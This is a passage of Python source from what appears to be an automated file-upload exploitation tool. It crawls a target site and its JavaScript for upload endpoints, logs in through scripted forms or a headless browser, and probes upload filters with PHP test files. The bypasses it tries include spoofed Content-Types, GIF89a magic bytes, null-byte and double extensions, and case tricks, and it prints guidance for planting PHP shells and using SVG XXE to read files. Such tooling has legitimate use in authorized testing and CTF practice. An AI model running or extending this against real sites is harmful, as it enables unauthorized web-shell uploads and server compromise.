        r'(?:Warning|Error|Fatal|Notice|Exception)[^/]*((?:/[\w.-]+){2,})',
        r'DOCUMENT_ROOT["\s=:]+([^\s"\'<>]+)',
        r'(?:failed to open|No such file)[^/]*((?:/[\w.-]+){2,})',
        r'(?:upload_?(?:dir|path|folder|directory))\s*[=:]\s*["\']?([^\s"\'<>,]+)',
    ]

    @staticmethod
    def extract_filename(response_text, original_filename):
        """Try to extract the server-assigned filename from the response."""
        if not response_text:
            return None

        for pattern in ResponseParser.FILENAME_PATTERNS:
            matches = re.findall(pattern, response_text, re.I)
            for match in matches:
                # Clean up the match
                name = match.strip().split("/")[-1]
                if name and name != original_filename and "." in name:
                    # Looks like a real filename
                    if len(name) < 300 and not name.startswith("<"):
                        return name
        return None

    @staticmethod
    def extract_upload_path(response_text):
        """Extract upload directory path from response."""
        paths = []
        for pattern in ResponseParser.PATH_PATTERNS:
            matches = re.findall(pattern, response_text, re.I)
            for m in matches:
                if any(kw in m.lower() for kw in
                       ["upload", "file", "image", "media", "avatar",
                        "storage", "tmp", "public", "content"]):
                    paths.append(m)
        return paths

    @staticmethod
    def extract_error_paths(response_text):
        """Extract paths from error messages."""
        paths = []
        for pattern in ResponseParser.ERROR_PATH_PATTERNS:
            matches = re.findall(pattern, response_text, re.I)
            paths.extend(matches)
        return list(set(paths))

    @staticmethod
    def extract_url(response_text, base_url):
        """Extract direct URL to uploaded file."""
        urls = []
        # JSON url field
        for pattern in [r'"(?:url|src|path|link|file_url|download_url)":\s*"([^"]+)"']:
            matches = re.findall(pattern, response_text, re.I)
            for m in matches:
                if m.startswith("http"):
                    urls.append(m)
                elif m.startswith("/"):
                    urls.append(urljoin(base_url, m))
        return urls


# ═══════════════════════════════════════════════════════════════════════════════
#  SMART RECON — Crawl pages, parse JS, discover ALL upload surfaces
# ═══════════════════════════════════════════════════════════════════════════════

class SmartRecon:
    """
    Crawls the target site, follows links, parses JavaScript files,
    and discovers ALL upload surfaces (form-based and AJAX-based).
    Solves the /contact scenario where uploads are JS-driven.
    """

    # Regex patterns to find upload endpoints in JavaScript files
    JS_UPLOAD_PATTERNS = [
        # fetch() with POST
        r"""fetch\s*\(\s*['"`]([^'"`]+)['"`]\s*,\s*\{[^}]*method\s*:\s*['"`]POST['"`]""",
        # $.ajax / jQuery
        r"""\$\.ajax\s*\(\s*\{[^}]*url\s*:\s*['"`]([^'"`]+)['"`]""",
        r"""\$\.post\s*\(\s*['"`]([^'"`]+)['"`]""",
        # XMLHttpRequest
        r"""\.open\s*\(\s*['"`]POST['"`]\s*,\s*['"`]([^'"`]+)['"`]""",
        # action/url near upload/file context
        r"""(?:action|url|uploadUrl|upload_url|endpoint)\s*[:=]\s*['"`]([^'"`]+)['"`]""",
        # Direct form action assignment
        r"""\.action\s*=\s*['"`]([^'"`]+)['"`]""",
        # Axios
        r"""axios\.post\s*\(\s*['"`]([^'"`]+)['"`]""",
        # Generic URL near FormData usage
        r"""['"`](\/[^'"`]*(?:upload|submit|save|import|attach)[^'"`]*)['"`]""",
    ]

    # Regex patterns to find field names in JavaScript
    JS_FIELD_PATTERNS = [
        r"""\.append\s*\(\s*['"`]([^'"`]+)['"`]\s*,\s*(?:file|document|blob|input)""",
        r"""\.append\s*\(\s*['"`]([^'"`]+)['"`]\s*,\s*\$?\(?\s*['"`#]""",
        r"""name\s*[:=]\s*['"`]([^'"`]*(?:file|upload|image|avatar|attachment)[^'"`]*)['"`]""",
    ]

    def __init__(self, session_manager, hitl=None, disc=None,
                 max_depth=2, timeout=10):
        self.sm = session_manager
        self.hitl = hitl or HumanInTheLoop(enabled=False)
        self.d = disc
        self.max_depth = max_depth
        self.timeout = timeout
        self._visited = set()
        self._js_cache = {}

    def discover(self, start_url):
        """
        Full discovery orchestrator:
        1. Crawl all pages within the target origin
        2. For each page, find upload forms + standalone file inputs + JS endpoints
        3. Cross-reference and deduplicate
        4. Fall back to human-in-the-loop if nothing found
        Returns list of UploadTarget.
        """
        info(f"{'─' * 50}")
        info("SMART RECON — Discovering upload surfaces")
        info(f"{'─' * 50}")

        target_base = start_url.rstrip("/")
        parsed = urlparse(target_base)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        # Phase 1: Crawl
        pages = self.crawl(target_base, origin)
        ok(f"Crawled {len(pages)} pages")

        # Phase 2: Find upload surfaces on each page
        all_targets = []
        standalone_inputs = []  # file inputs not in a form

        for page_url in pages:
            try:
                r = self.sm.session.get(page_url, timeout=self.timeout)
                if r.status_code != 200:
                    continue
                html = r.text

                # Find form-based uploads
                form_targets = self.find_upload_forms(html, page_url)
                all_targets.extend(form_targets)

                # Find standalone file inputs (JS-driven)
                standalone = self.find_standalone_inputs(html, page_url)
                standalone_inputs.extend(standalone)

                # Find JS-referenced upload endpoints
                js_targets = self.find_js_uploads(html, page_url, origin)
                all_targets.extend(js_targets)

            except Exception as e:
                debug(f"SmartRecon error on {page_url}: {e}")

        # Phase 3: Cross-reference standalone inputs with JS endpoints
        for si_field, si_accept, si_page in standalone_inputs:
            # Check if any JS target matches this field name
            matched = False
            for t in all_targets:
                if t.page_url == si_page and t.method == "ajax":
                    # Enrich with field info from the HTML input
                    if t.field_name == "uploadFile" and si_field:
                        t.field_name = si_field
                    if si_accept:
                        t.accept_attr = si_accept
                    matched = True

            if not matched and si_field:
                # We found a file input but no JS endpoint — try common patterns
                page_parsed = urlparse(si_page)
                page_dir = os.path.dirname(page_parsed.path)
                page_name = os.path.basename(page_parsed.path)
                guesses = [
                    f"{page_dir}/upload.php",
                    f"{page_dir}/submit.php",
                    f"{page_dir}/file_upload.php",
                    f"{page_dir}/upload_handler.php",
                    f"{page_dir}/upload",
                    f"{page_dir}/submit",
                    "/upload.php",
                    "/upload",
                    "/file_upload.php",
                    "/submit.php",
                    # If page is /contact, try /contact/upload.php etc.
                    f"{page_parsed.path}/upload.php",
                    f"{page_parsed.path}/submit.php",
                    f"{page_parsed.path}/file_upload.php",
                ]
                # Deduplicate
                guesses = list(dict.fromkeys(guesses))
                for guess in guesses:
                    guess_url = f"{origin}{guess}"
                    try:
                        # Try POST first (more likely for upload endpoints)
                        r = self.sm.session.post(guess_url, timeout=5,
                                                 data={"test": "1"})
                        if r.status_code in [200, 301, 302, 400, 403, 405, 411, 413, 422]:
                            all_targets.append(UploadTarget(
                                endpoint_url=guess_url,
                                field_name=si_field,
                                method="ajax",
                                page_url=si_page,
                                accept_attr=si_accept,
                            ))
                            ok(f"Guessed upload endpoint: {guess_url}")
                            matched = True
                            break
                    except:
                        pass
                    try:
                        r = self.sm.session.options(guess_url, timeout=5)
                        if r.status_code in [200, 204, 405]:
                            all_targets.append(UploadTarget(
                                endpoint_url=guess_url,
                                field_name=si_field,
                                method="ajax",
                                page_url=si_page,
                                accept_attr=si_accept,
                            ))
                            ok(f"Guessed upload endpoint: {guess_url}")
                            matched = True
                            break
                    except:
                        pass

                if not matched:
                    warn(f"File input '{si_field}' on {si_page} — upload endpoint unknown")
                    if self.hitl.enabled:
                        ep = self.hitl.ask_endpoint(
                            f"Found <input type='file' name='{si_field}'> on {si_page} "
                            f"but no upload endpoint in JavaScript.\n"
                            f"  Check /contact/script.js or use Burp to intercept the upload."
                        )
                        if ep:
                            ep_url = ep if ep.startswith("http") else f"{origin}{ep}"
                            all_targets.append(UploadTarget(
                                endpoint_url=ep_url,
                                field_name=si_field,
                                method="ajax",
                                page_url=si_page,
                                accept_attr=si_accept,
                            ))

        # Phase 4: Deduplicate and RANK targets
        # Priority: AJAX/POST > Form POST > Form GET
        # GET forms can't do file uploads — the file is always JS-driven
        seen = set()
        unique_targets = []
        for t in all_targets:
            key = (t.endpoint_url, t.field_name)
            if key not in seen:
                seen.add(key)
                unique_targets.append(t)

        def _rank_target(t):
            """Lower score = higher priority."""
            if t.method == "ajax":
                return 0  # JS-driven upload (most likely the real endpoint)
            if t.method == "form" and t.form_method == "post":
                return 1  # Standard form POST
            if t.method == "manual":
                return 2  # User-provided
            return 3  # GET forms (can't upload files — just the form submit)

        unique_targets.sort(key=_rank_target)

        # Report findings
        if unique_targets:
            ok(f"Discovered {len(unique_targets)} upload target(s):")
            for i, t in enumerate(unique_targets, 1):
                print(f"    {G}{i}.{W} {t.method.upper():5} {t.endpoint_url}")
                print(f"       Field: {t.field_name}  "
                      f"Accept: {t.accept_attr or 'any'}  "
                      f"Page: {t.page_url}")
                if t.js_source:
                    print(f"       JS: {t.js_source}")
        else:
            warn("No upload surfaces discovered")
            if self.hitl.enabled:
                ep = self.hitl.ask_endpoint(
                    f"Crawled {len(pages)} pages but found no upload forms or JS endpoints."
                )
                if ep:
                    field = self.hitl.ask_field()
                    ep_url = ep if ep.startswith("http") else f"{origin}{ep}"
                    unique_targets.append(UploadTarget(
                        endpoint_url=ep_url,
                        field_name=field,
                        method="manual",
                        page_url=target_base,
                    ))

        if self.d:
            for t in unique_targets:
                self.d.log("recon", "found",
                           f"Upload: {t.method} {t.endpoint_url} field={t.field_name}")

        return unique_targets

    def crawl(self, start_url, origin, depth=0):
        """BFS crawl within the same origin up to max_depth."""
        if depth > self.max_depth or start_url in self._visited:
            return []

        self._visited.add(start_url)
        pages = [start_url]

        try:
            r = self.sm.session.get(start_url, timeout=self.timeout)
            if r.status_code != 200:
                return pages
        except:
            return pages

        # Extract links
        links = set()
        if BS4_OK:
            try:
                soup = BeautifulSoup(r.text, "html.parser")
                for a in soup.find_all("a", href=True):
                    href = a["href"].strip()
                    if href.startswith("#") or href.startswith("javascript:"):
                        continue
                    abs_url = urljoin(start_url, href).split("#")[0].split("?")[0]
                    if abs_url.startswith(origin) and abs_url not in self._visited:
                        links.add(abs_url)
            except:
                pass
        else:
            for m in re.finditer(r'<a[^>]+href=["\']([^"\'#]+)["\']', r.text, re.I):
                href = m.group(1).strip()
                if href.startswith("javascript:"):
                    continue
                abs_url = urljoin(start_url, href).split("#")[0].split("?")[0]
                if abs_url.startswith(origin) and abs_url not in self._visited:
                    links.add(abs_url)

        # Recurse into discovered links
        for link in sorted(links):
            pages.extend(self.crawl(link, origin, depth + 1))

        return pages

    def find_upload_forms(self, html, page_url):
        """Find <form> elements that contain <input type='file'>."""
        targets = []

        if BS4_OK:
            try:
                soup = BeautifulSoup(html, "html.parser")
                for form in soup.find_all("form"):
                    file_inputs = form.find_all("input", {"type": "file"})
                    if not file_inputs:
                        continue

                    action = form.get("action", "")
                    method = form.get("method", "post").lower()
                    abs_action = urljoin(page_url, action) if action else page_url

                    # Get the file input field name
                    field_name = file_inputs[0].get("name", "uploadFile")
                    accept = file_inputs[0].get("accept", "")

                    # Collect hidden fields
                    extra = {}
                    for inp in form.find_all("input", {"type": "hidden"}):
                        n = inp.get("name")
                        if n:
                            extra[n] = inp.get("value", "")

                    targets.append(UploadTarget(
                        endpoint_url=abs_action,
                        field_name=field_name,
                        method="form",
                        extra_fields=extra,
                        page_url=page_url,
                        accept_attr=accept,
                        form_method=method,
                    ))
                    ok(f"Form upload: {field_name} → {abs_action} ({method.upper()})")
            except:
                pass
        else:
            # Regex fallback
            for m in re.finditer(
                r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
                html, re.I | re.S):
                form_html = m.group(2)
                if 'type="file"' in form_html or "type='file'" in form_html:
                    action = urljoin(page_url, m.group(1))
                    fm = re.search(r'name=["\']([^"\']+)["\']', form_html)
                    field = fm.group(1) if fm else "uploadFile"
                    targets.append(UploadTarget(
                        endpoint_url=action,
                        field_name=field,
                        method="form",
                        page_url=page_url,
                    ))

        return targets

    def find_standalone_inputs(self, html, page_url):
        """Find <input type='file'> NOT inside a <form>. These are JS-driven."""
        results = []

        if BS4_OK:
            try:
                soup = BeautifulSoup(html, "html.parser")
                for inp in soup.find_all("input", {"type": "file"}):
                    # Check if this input is inside a form that has a file-accepting action
                    parent_form = inp.find_parent("form")
                    if parent_form:
                        # It IS in a form — but check if the form's method is GET
                        # (GET forms can't do file uploads; the upload is JS-driven)
                        form_method = parent_form.get("method", "post").lower()
                        if form_method == "post":
                            continue  # Normal form upload, handled by find_upload_forms
                        # GET form with file input = JS-driven upload

                    field_name = inp.get("name", "")
                    accept = inp.get("accept", "")
                    if field_name:
                        results.append((field_name, accept, page_url))
                        info(f"Standalone file input: name='{field_name}' "
                             f"accept='{accept}' on {page_url}")
            except:
                pass
        else:
            # Simple regex: find file inputs
            for m in re.finditer(
                r'<input[^>]+type=["\']file["\'][^>]*name=["\']([^"\']+)["\'][^>]*>',
                html, re.I):
                field_name = m.group(1)
                accept_m = re.search(r'accept=["\']([^"\']+)["\']', m.group(0))
                accept = accept_m.group(1) if accept_m else ""
                results.append((field_name, accept, page_url))

        return results

    def find_js_uploads(self, html, page_url, origin):
        """Fetch JS files referenced in the page and extract upload endpoints."""
        targets = []
        js_urls = set()

        # Extract <script src="..."> URLs
        if BS4_OK:
            try:
                soup = BeautifulSoup(html, "html.parser")
                for script in soup.find_all("script", src=True):
                    src = script["src"]
                    # Skip external CDN scripts
                    abs_src = urljoin(page_url, src)
                    if abs_src.startswith(origin) or src.startswith("/") or src.startswith("./"):
                        js_urls.add(urljoin(page_url, src))
            except:
                pass
        else:
            for m in re.finditer(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.I):
                src = m.group(1)
                abs_src = urljoin(page_url, src)
                if abs_src.startswith(origin) or src.startswith("/") or src.startswith("./"):
                    js_urls.add(abs_src)

        # Also check inline <script> blocks
        inline_js = ""
        if BS4_OK:
            try:
                soup = BeautifulSoup(html, "html.parser")
                for script in soup.find_all("script"):
                    if not script.get("src") and script.string:
                        inline_js += script.string + "\n"
            except:
                pass
        else:
            for m in re.finditer(r'<script(?:\s[^>]*)?>(.+?)</script>', html, re.I | re.S):
                if 'src=' not in m.group(0):
                    inline_js += m.group(1) + "\n"

        # Parse inline JS first
        if inline_js:
            endpoints, fields = self._parse_js_content(inline_js)
            for ep in endpoints:
                abs_ep = urljoin(page_url, ep)
                field = fields[0] if fields else "uploadFile"
                targets.append(UploadTarget(
                    endpoint_url=abs_ep,
                    field_name=field,
                    method="ajax",
                    page_url=page_url,
                    js_source="inline",
                ))
                ok(f"JS upload (inline): {abs_ep} field={field}")

        # Fetch and parse external JS files
        for js_url in js_urls:
            if js_url in self._js_cache:
                js_content = self._js_cache[js_url]
            else:
                try:
                    r = self.sm.session.get(js_url, timeout=self.timeout)
                    js_content = r.text if r.status_code == 200 else ""
                    self._js_cache[js_url] = js_content
                except:
                    continue

            if not js_content:
                continue

            endpoints, fields = self._parse_js_content(js_content)
            for ep in endpoints:
                abs_ep = urljoin(page_url, ep)
                field = fields[0] if fields else "uploadFile"
                targets.append(UploadTarget(
                    endpoint_url=abs_ep,
                    field_name=field,
                    method="ajax",
                    page_url=page_url,
                    js_source=js_url,
                ))
                ok(f"JS upload ({os.path.basename(js_url)}): {abs_ep} field={field}")

        return targets

    def _parse_js_content(self, js_content):
        """Extract upload endpoints and field names from JavaScript code."""
        endpoints = []
        fields = []

        for pattern in self.JS_UPLOAD_PATTERNS:
            for m in re.finditer(pattern, js_content, re.I | re.S):
                ep = m.group(1).strip()
                # Filter out obvious non-upload URLs
                if ep and not ep.startswith("http") and not ep.startswith("//"):
                    if not any(x in ep.lower() for x in
                               ["cdn.", "analytics", "google", "facebook",
                                "twitter", ".css", ".woff", ".ttf"]):
                        if ep not in endpoints:
                            endpoints.append(ep)
                elif ep and (ep.startswith("http") or ep.startswith("//")):
                    if not any(x in ep.lower() for x in
                               ["cdn.", "analytics", "google", "facebook"]):
                        if ep not in endpoints:
                            endpoints.append(ep)

        for pattern in self.JS_FIELD_PATTERNS:
            for m in re.finditer(pattern, js_content, re.I):
                field = m.group(1).strip()
                if field and field not in fields:
                    fields.append(field)

        return endpoints, fields


# ═══════════════════════════════════════════════════════════════════════════════
#  SESSION MANAGER
# ═══════════════════════════════════════════════════════════════════════════════

class SessionManager:
    def __init__(self, target, login_url=None, creds=None,
                 nav_url=None, upload_page=None,
                 user_field="username", pass_field="password",
                 extra_headers=None, extra_cookies=None,
                 proxy=None, timeout=15, disc=None):
        self.target = target
        self.login_url = login_url
        self.creds = creds or {}
        self.nav_url = nav_url
        self.upload_page = upload_page
        self.user_field = user_field
        self.pass_field = pass_field
        self.d = disc
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({"User-Agent": random.choice(USER_AGENTS)})

        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

        if extra_headers:
            for h in extra_headers:
                k, v = h.split(":", 1)
                self.session.headers[k.strip()] = v.strip()

        if extra_cookies:
            for c in extra_cookies:
                k, v = c.split("=", 1)
                self.session.cookies.set(k.strip(), v.strip())

    def fingerprint(self):
        """Fingerprint the target server."""
        try:
            r = self.session.get(self.target, timeout=self.timeout)
            headers = dict(r.headers)
            info_dict = {}
            for h in ["Server", "X-Powered-By", "X-AspNet-Version",
                       "X-AspNetMvc-Version", "X-Generator"]:
                if h in headers:
                    info_dict[h] = headers[h]

            # Detect technology from response
            body = r.text.lower()
            techs = []
            if "php" in headers.get("X-Powered-By", "").lower() or "php" in headers.get("Server", "").lower():
                techs.append("PHP")
            if "asp.net" in headers.get("X-Powered-By", "").lower() or "microsoft-iis" in headers.get("Server", "").lower():
                techs.append("ASP.NET/IIS")
            if any(x in headers.get("Server", "").lower() for x in ["tomcat", "jboss", "wildfly", "jetty", "glassfish"]):
                techs.append("Java")
            if "coldfusion" in body or "cfm" in body:
                techs.append("ColdFusion")
            if "node" in headers.get("X-Powered-By", "").lower() or "express" in headers.get("X-Powered-By", "").lower():
                techs.append("Node.js")
            if "nginx" in headers.get("Server", "").lower():
                techs.append("Nginx")
            if "apache" in headers.get("Server", "").lower():
                techs.append("Apache")

            info_dict["technologies"] = techs
            info_dict["status_code"] = r.status_code

            if self.d:
                self.d.server_info = info_dict

            ok(f"Server: {headers.get('Server', 'unknown')}")
            if techs:
                ok(f"Technologies: {', '.join(techs)}")

            return info_dict
        except Exception as e:
            fail(f"Fingerprint failed: {e}")
            return {}

    def _get_csrf(self, url):
        try:
            r = self.session.get(url, timeout=self.timeout)
            m = re.search(
                r'<meta[^>]+name=["\']csrf[_-]?token["\'][^>]+content=["\']([^"\']+)["\']',
                r.text, re.I)
            if m:
                return m.group(1)
            m = re.search(
                r'<input[^>]+name=["\'](_token|csrf[_-]?token|authenticity_token)["\'][^>]+value=["\']([^"\']+)["\']',
                r.text, re.I)
            if m:
                return m.group(2)
            if BS4_OK:
                soup = BeautifulSoup(r.text, "html.parser")
                for inp in soup.find_all("input", {"type": "hidden"}):
                    n = (inp.get("name") or "").lower()
                    if "csrf" in n or "token" in n or n == "_token":
                        return inp.get("value", "")
        except:
            pass
        return None

    def _parse_form(self, url):
        try:
            r = self.session.get(url, timeout=self.timeout)
            if not BS4_OK:
                return urljoin(url, "/login"), "post", {
                    self.user_field: self.creds.get("username", ""),
                    self.pass_field: self.creds.get("password", ""),
                }
            soup = BeautifulSoup(r.text, "html.parser")
            form = soup.find("form")
            if not form:
                return url, "post", {}
            action = urljoin(url, form.get("action", url))
            method = form.get("method", "post").lower()
            fields = {}
            for inp in form.find_all(["input", "select", "textarea"]):
                name = inp.get("name")
                if not name:
                    continue
                fields[name] = inp.get("value", "")
            return action, method, fields
        except:
            return url, "post", {}

    def login_requests(self):
        if not self.login_url or not self.creds:
            return True
        info(f"LOGIN → {self.login_url}")
        action, method, fields = self._parse_form(self.login_url)
        for k in list(fields.keys()):
            kl = k.lower()
            if any(x in kl for x in ["user", "email", "login", "name"]):
                fields[k] = self.creds.get("username", "")
            if any(x in kl for x in ["pass", "pwd", "secret"]):
                fields[k] = self.creds.get("password", "")
        fields[self.user_field] = self.creds.get("username", "")
        fields[self.pass_field] = self.creds.get("password", "")

        try:
            r = self.session.post(action, data=fields,
                                  allow_redirects=True, timeout=self.timeout) \
                if method == "post" else \
                self.session.get(action, params=fields,
                                 allow_redirects=True, timeout=self.timeout)
            page = r.text.lower()
            if any(x in page for x in ["logout", "dashboard", "welcome",
                                        "profile", "sign out", "my account"]):
                ok("Login successful")
                return True
            if self.login_url not in r.url:
                ok(f"Redirected → {r.url}")
                return True
            warn("Login response ambiguous — continuing")
            return True
        except Exception as e:
            fail(f"Login error: {e}")
            return False

    def login_selenium(self, headless=True):
        if not SELENIUM_OK:
            fail("selenium not installed (pip install selenium)")
            return False
        info(f"BROWSER LOGIN → {self.login_url}")
        try:
            opts = webdriver.ChromeOptions()
            if headless:
                opts.add_argument("--headless=new")
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            opts.add_argument("--disable-blink-features=AutomationControlled")
            driver = webdriver.Chrome(options=opts)
            wait = WebDriverWait(driver, 15)
            driver.get(self.login_url)
            time.sleep(1)

            for sel in [f"input[name='{self.user_field}']",
                        "input[type='email']", "input[type='text']",
                        "input[name='username']", "input[name='email']"]:
                try:
                    el = driver.find_element(By.CSS_SELECTOR, sel)
                    el.clear()
                    el.send_keys(self.creds.get("username", ""))
                    break
                except:
                    pass

            for sel in [f"input[name='{self.pass_field}']",
                        "input[type='password']", "input[name='password']"]:
                try:
                    el = driver.find_element(By.CSS_SELECTOR, sel)
                    el.clear()
                    el.send_keys(self.creds.get("password", ""))
                    break
                except:
                    pass

            time.sleep(0.5)
            for sel in ["button[type='submit']", "input[type='submit']",
                        "button[class*='login']", "form button"]:
                try:
                    driver.find_element(By.CSS_SELECTOR, sel).click()
                    break
                except:
                    pass

            time.sleep(2)
            if self.nav_url:
                driver.get(urljoin(self.target, self.nav_url))
                time.sleep(1)
            if self.upload_page:
                driver.get(urljoin(self.target, self.upload_page))
                time.sleep(1)

            for cookie in driver.get_cookies():
                self.session.cookies.set(cookie["name"], cookie["value"])

            ok(f"Browser login done, cookies: {list(self.session.cookies.keys())}")
            driver.quit()
            return True
        except Exception as e:
            fail(f"Selenium error: {e}")
            return False

    def login(self, method="auto"):
        if method == "selenium":
            return self.login_selenium()
        elif method == "requests":
            return self.login_requests()
        else:
            ok_r = self.login_requests()
            if not ok_r and SELENIUM_OK:
                warn("Requests login failed — trying browser...")
                return self.login_selenium()
            return ok_r

    def navigate(self):
        if self.nav_url:
            url = urljoin(self.target, self.nav_url)
            try:
                r = self.session.get(url, timeout=self.timeout, allow_redirects=True)
                ok(f"Navigated → {url} (HTTP {r.status_code})")
            except Exception as e:
                fail(f"Navigation error: {e}")
        if self.upload_page:
            url = urljoin(self.target, self.upload_page)
            try:
                r = self.session.get(url, timeout=self.timeout, allow_redirects=True)
                ok(f"Upload page → {url} (HTTP {r.status_code})")
            except Exception as e:
                fail(f"Upload page error: {e}")

    def find_upload_field(self):
        page = self.upload_page or "/"
        url = urljoin(self.target, page)
        try:
            r = self.session.get(url, timeout=self.timeout)
            if BS4_OK:
                soup = BeautifulSoup(r.text, "html.parser")
                for inp in soup.find_all("input", {"type": "file"}):
                    name = inp.get("name")
                    if name:
                        return name
            m = re.search(r'<input[^>]+type=["\']file["\'][^>]+name=["\']([^"\']+)["\']',
                          r.text, re.I)
            if m:
                return m.group(1)
        except:
            pass
        return None

    def find_upload_endpoint(self):
        page = self.upload_page or "/"
        url = urljoin(self.target, page)
        try:
            r = self.session.get(url, timeout=self.timeout)
            if BS4_OK:
                soup = BeautifulSoup(r.text, "html.parser")
                for form in soup.find_all("form"):
                    if form.find("input", {"type": "file"}):
                        action = form.get("action")
                        if action:
                            return urljoin(url, action)
            m = re.search(
                r'<form[^>]+action=["\']([^"\']+)["\'][^>]*>.*?<input[^>]+type=["\']file["\']',
                r.text, re.I | re.S)
            if m:
                return urljoin(url, m.group(1))
        except:
            pass
        return None

    def find_upload_extra_fields(self):
        """Find hidden fields on the upload form (CSRF tokens, etc)."""
        page = self.upload_page or "/"
        url = urljoin(self.target, page)
        fields = {}
        try:
            r = self.session.get(url, timeout=self.timeout)
            if BS4_OK:
                soup = BeautifulSoup(r.text, "html.parser")
                for form in soup.find_all("form"):
                    if form.find("input", {"type": "file"}):
                        for inp in form.find_all("input", {"type": "hidden"}):
                            name = inp.get("name")
                            if name:
                                fields[name] = inp.get("value", "")
        except:
            pass
        return fields


# ═══════════════════════════════════════════════════════════════════════════════
#  FILTER PROBE
# ═══════════════════════════════════════════════════════════════════════════════

class FilterProbe:
    def __init__(self, upload_fn, disc, field="uploadFile"):
        self.upload = upload_fn
        self.d = disc
        self.field = field
        self.results = {}

    def _ok(self, status, body):
        if status not in [200, 201, 302]:
            return False
        bad = ["only images", "not allowed", "invalid", "blocked", "failed",
               "disallowed", "rejected", "extension", "mime", "forbidden",
               "error", "denied", "illegal", "unsupported"]
        return not any(k in body.lower() for k in bad)

    def probe_all(self):
        info(f"{'─' * 50}")
        info("FILTER FINGERPRINTING")
        info(f"{'─' * 50}")
        self._probe_ext_php()
        self._probe_ext_variants()
        self._probe_whitelist()
        self._probe_content_type()
        self._probe_mime()
        self._probe_null_byte()
        self._probe_double_ext()
        self._probe_case()
        self._probe_size()
        self._probe_svg()
        self._probe_client_side()
        self._print_guidance()
        print()
        return self.results

    def _print_guidance(self):
        """Print actionable guidance based on probe findings."""
        r = self.results
        tips = []

        if r.get("client_side_only"):
            tips.append(f"{G}EASY WIN:{W} Client-side only validation — upload .php directly via curl/Burp")

        if not r.get("ext_blacklist"):
            tips.append(f"{G}No extension blacklist{W} — .php upload should work if CT/MIME are handled")

        if r.get("ext_blacklist"):
            if any(r.get(f"ext_{v}_allowed") for v in ["phtml", "pht", "php5", "phar"]):
                allowed = [v for v in ["phtml", "pht", "php5", "phar"] if r.get(f"ext_{v}_allowed")]
                tips.append(f"{G}Blacklist incomplete:{W} try .{', .'.join(allowed)}")
            else:
                tips.append(f"{Y}Extension blacklist active{W} — try --char-inject or --htaccess")

        if r.get("whitelist"):
            tips.append(f"{Y}Whitelist active{W} — try double extension (shell.php.jpg) or character injection")
            tips.append(f"  Bypass: shell.jpg.php (reverse double ext if Apache misconfigured)")
            tips.append(f"  Bypass: shell.php%00.jpg (null byte, PHP <5.4)")
            tips.append(f"  Bypass: shell.php%0a.jpg (newline injection)")

        if r.get("ct_bypass"):
            tips.append(f"{G}Content-Type bypassable{W} — set Content-Type: image/jpeg on PHP upload")
        elif r.get("ct_filter"):
            tips.append(f"{Y}Content-Type validated{W} — must use image/* Content-Type")

        if r.get("mime_bypass_gif"):
            tips.append(f"{G}MIME filter bypassed{W} — prepend GIF89a; to PHP shell")
        elif r.get("mime_filter"):
            tips.append(f"{Y}MIME/magic byte validated{W} — use polyglot images (--polyglot)")

        if r.get("null_byte"):
            tips.append(f"{G}Null byte works!{W} — shell.php%00.jpg bypasses extension check")

        if r.get("double_ext"):
            tips.append(f"{G}Double extension accepted:{W} {r['double_ext']}")

        if r.get("case_bypass"):
            tips.append(f"{G}Case bypass works:{W} {r['case_bypass']}")

        if r.get("svg_allowed"):
            tips.append(f"{G}SVG allowed{W} — try XXE: --svg-read /flag.txt")

        if tips:
            print(f"\n{C}{BOLD}  GUIDANCE — Recommended next steps:{W}")
            for tip in tips:
                print(f"    → {tip}")
            print()

    def _probe_ext_php(self):
        s, b = self.upload("test.php", b"<?php echo 'UP'; ?>", "application/x-php")[:2]
        if not self._ok(s, b):
            self.d.filter_detected("Extension Blacklist (.php blocked)")
            self.results["ext_blacklist"] = True
        else:
            self.results["ext_blacklist"] = False
            self.d.log("probe", "info", ".php accepted — no extension filter")

    def _probe_ext_variants(self):
        for ext, label in [(".phtml", "phtml"), (".pht", "pht"),
                           (".php5", "php5"), (".phar", "phar")]:
            s, b = self.upload(f"test{ext}", b"<?php echo 'UP'; ?>", "image/jpeg")[:2]
            if self._ok(s, b):
                self.d.log("probe", "info", f"{ext} accepted — incomplete blacklist")
                self.results[f"ext_{label}_allowed"] = True
                return
        self.results["ext_variants_blocked"] = True

    def _probe_whitelist(self):
        s, b = self.upload("test.xyz", b"test", "application/octet-stream")[:2]
        if not self._ok(s, b):
            self.d.filter_detected("Extension Whitelist (only specific extensions)")
            self.results["whitelist"] = True
        else:
            self.results["whitelist"] = False

    def _probe_content_type(self):
        s, b = self.upload("test.php", b"<?php echo 'UP'; ?>", "image/jpeg")[:2]
        if self._ok(s, b):
            self.d.filter_bypassed("Content-Type Filter", "spoof to image/jpeg")
            self.results["ct_bypass"] = True
        else:
            s2, b2 = self.upload("test.jpg", b"<?php echo 'UP'; ?>", "application/x-php")[:2]
            if not self._ok(s2, b2):
                self.d.filter_detected("Content-Type Validation")
                self.results["ct_filter"] = True

    def _probe_mime(self):
        s, b = self.upload("test.php", b"GIF89a;\n<?php echo 'UP'; ?>", "image/gif")[:2]
        if self._ok(s, b):
            self.d.filter_bypassed("MIME Filter", "GIF89a magic bytes")
            self.results["mime_bypass_gif"] = True
        else:
            self.d.filter_detected("MIME/Magic-Byte Validation")
            self.results["mime_filter"] = True

    def _probe_null_byte(self):
        s, b = self.upload("test.php%00.jpg", b"<?php echo 'UP'; ?>", "image/jpeg")[:2]
        if self._ok(s, b):
            self.d.filter_bypassed("Extension Filter", "null byte %00")
            self.results["null_byte"] = True

    def _probe_double_ext(self):
        for fn in ["test.php.jpg", "test.jpg.php", "test.php.png"]:
            s, b = self.upload(fn, b"<?php echo 'UP'; ?>", "image/jpeg")[:2]
            if self._ok(s, b):
                self.d.log("probe", "info", f"Double extension accepted: {fn}")
                self.results["double_ext"] = fn
                return

    def _probe_case(self):
        for fn in ["test.PHP", "test.pHp", "test.Php"]:
            s, b = self.upload(fn, b"<?php echo 'UP'; ?>", "image/jpeg")[:2]
            if self._ok(s, b):
                self.d.log("probe", "info", f"Case variation accepted: {fn}")
                self.results["case_bypass"] = fn
                return

    def _probe_size(self):
        s, b = self.upload("big.jpg", b"A" * 5 * 1024 * 1024, "image/jpeg")[:2]
        if not self._ok(s, b):
